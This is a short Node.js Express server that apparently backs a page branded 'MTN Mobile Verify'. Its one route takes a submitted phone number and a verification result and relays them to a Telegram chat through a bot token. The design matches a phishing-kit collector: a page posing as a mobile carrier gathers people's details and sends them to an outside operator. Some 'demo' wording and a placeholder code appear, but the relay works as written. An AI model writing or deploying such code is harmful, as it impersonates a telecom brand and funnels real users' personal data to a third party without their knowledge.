const express = require("express");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.static(__dirname));

app.post("/mtn-mobile-verify-submission", async (req, res) => {
  const { phone, success } = req.body;

  if (typeof phone !== "string" || typeof success !== "boolean") {
    return res.status(400).json({
      error: "Valid demo submission"
    });
  }

  const result = success
    ? "Verification successful"
    : "Verification failed";

  const message =
    `🧪 MTN Mobile Verify\n\n` +
    `Phone: ${phone}\n` +
    `Result: ${result}\n` +
    `Verification code: MTN MOBILE USERS`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message
        })
      }
    );

    if (!response.ok) {
      return res.status(500).json({
        error: "Telegram notification failed"
      });
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({
      error: "Server error"
    });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`MTN  server running on port ${PORT}`);
});